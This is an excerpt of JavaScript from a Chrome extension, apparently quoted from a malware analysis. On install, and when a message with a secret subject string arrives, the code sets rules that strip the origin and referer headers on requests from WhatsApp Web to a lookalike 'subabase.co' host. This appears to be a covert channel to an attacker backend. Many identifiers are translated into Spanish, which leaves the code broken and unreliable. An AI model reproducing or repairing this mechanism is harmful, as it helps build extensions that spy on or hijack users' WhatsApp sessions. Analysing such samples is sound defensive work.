    ...
    chrome.runtime.onInstalled.addListener((function(t) {
        ...
        if ("opnimansdfSDfds" == s.subject) {
            [{
                ...
                t : "c" ,
                tipo : [ "marco_principal" , "submarco" , "solicitud_xml" , "imagen" , "hoja_de_estilo" ],
                d : "https://web.whatsapp.com" ,
                filtro : "*://rscbunzafavbqopxvwpq.subabase.co/*" ,
                clave : "origen" ,
                valor : "" ,
                URL : ""
            }, {
                t : "c" ,
                tipo : [ "marco_principal" , "submarco" , "solicitud_xml" , "script" , "imagen" , "hoja_de_estilo" , "otro" ],
                d : "https://web.whatsapp.com" ,
                filtro : "*://rscbunzafavbqopxvwpq.subabase.co/*" ,
                clave : "referir" ,
                valor : "" ,
    ...
    const o = async ({
        ...
        try {
           const r = await fetch(t, {
            ...
            return {
                status: r.status,
                data: o ? await r.text() : await r.json()
            };
        } catch (t) {
            return {
                status: 404
